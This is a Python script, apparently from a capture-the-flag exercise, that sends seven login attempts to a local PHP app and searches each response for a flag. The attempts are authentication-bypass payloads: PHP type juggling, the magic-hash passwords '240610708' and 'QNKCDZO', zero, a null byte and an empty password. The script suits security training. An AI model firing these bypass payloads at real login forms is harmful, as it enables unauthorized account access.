import requests

target = "http://127.0.0.1:32907/index.php"

print("=== PHP Type Juggling & Loose Comparison Tests ===\n")

# Test 1: Boolean true as password
print("[TEST 1] Boolean true as password")
response = requests.post(target, data={"username": "admin", "password": "true"}, timeout=5)
print(f"Status: {response.status_code} | Length: {len(response.text)}B")
if "FLAG{" in response.text:
    import re
    flag = re.search(r'FLAG\{[^}]+\}', response.text)
    if flag:
        print(f"[!] FLAG FOUND: {flag.group()}")
        print(f"Full response:\n{response.text}")
else:
    print(f"No flag found")

# Test 2: Boolean true as username
print("\n[TEST 2] Boolean true as username")
response = requests.post(target, data={"username": "true", "password": "admin"}, timeout=5)
print(f"Status: {response.status_code} | Length: {len(response.text)}B")
if "FLAG{" in response.text:
    import re
    flag = re.search(r'FLAG\{[^}]+\}', response.text)
    if flag:
        print(f"[!] FLAG FOUND: {flag.group()}")
        print(f"Full response:\n{response.text}")
else:
    print(f"No flag found")

# Test 3: Magic hash - 240610708
print("\n[TEST 3] Magic hash - 240610708")
response = requests.post(target, data={"username": "admin", "password": "240610708"}, timeout=5)
print(f"Status: {response.status_code} | Length: {len(response.text)}B")
if "FLAG{" in response.text:
    import re
    flag = re.search(r'FLAG\{[^}]+\}', response.text)
    if flag:
        print(f"[!] FLAG FOUND: {flag.group()}")
        print(f"Full response:\n{response.text}")
else:
    print(f"No flag found")

# Test 4: Magic hash - QNKCDZO
print("\n[TEST 4] Magic hash - QNKCDZO")
response = requests.post(target, data={"username": "admin", "password": "QNKCDZO"}, timeout=5)
print(f"Status: {response.status_code} | Length: {len(response.text)}B")
if "FLAG{" in response.text:
    import re
    flag = re.search(r'FLAG\{[^}]+\}', response.text)
    if flag:
        print(f"[!] FLAG FOUND: {flag.group()}")
        print(f"Full response:\n{response.text}")
else:
    print(f"No flag found")

# Test 5: Integer 0 as password
print("\n[TEST 5] Integer 0 as password")
response = requests.post(target, data={"username": "admin", "password": "0"}, timeout=5)
print(f"Status: {response.status_code} | Length: {len(response.text)}B")
if "FLAG{" in response.text:
    import re
    flag = re.search(r'FLAG\{[^}]+\}', response.text)
    if flag:
        print(f"[!] FLAG FOUND: {flag.group()}")
        print(f"Full response:\n{response.text}")
else:
    print(f"No flag found")

# Test 6: Null byte in username
print("\n[TEST 6] Null byte in username")
response = requests.post(target, data={"username": "admin\x00", "password": "anything"}, timeout=5)
print(f"Status: {response.status_code} | Length: {len(response.text)}B")
if "FLAG{" in response.text:
    import re
    flag = re.search(r'FLAG\{[^}]+\}', response.text)
    if flag:
        print(f"[!] FLAG FOUND: {flag.group()}")
        print(f"Full response:\n{response.text}")
else:
    print(f"No flag found")

# Test 7: Empty password
print("\n[TEST 7] Empty password")
response = requests.post(target, data={"username": "admin", "password": ""}, timeout=5)
print(f"Status: {response.status_code} | Length: {len(response.text)}B")
if "FLAG{" in response.text:
    import re
    flag = re.search(r'FLAG\{[^}]+\}', response.text)
    if flag:
        print(f"[!] FLAG FOUND: {flag.group()}")
        print(f"Full response:\n{response.text}")
else:
    print(f"No flag found")

print("\n=== Tests Complete ===")

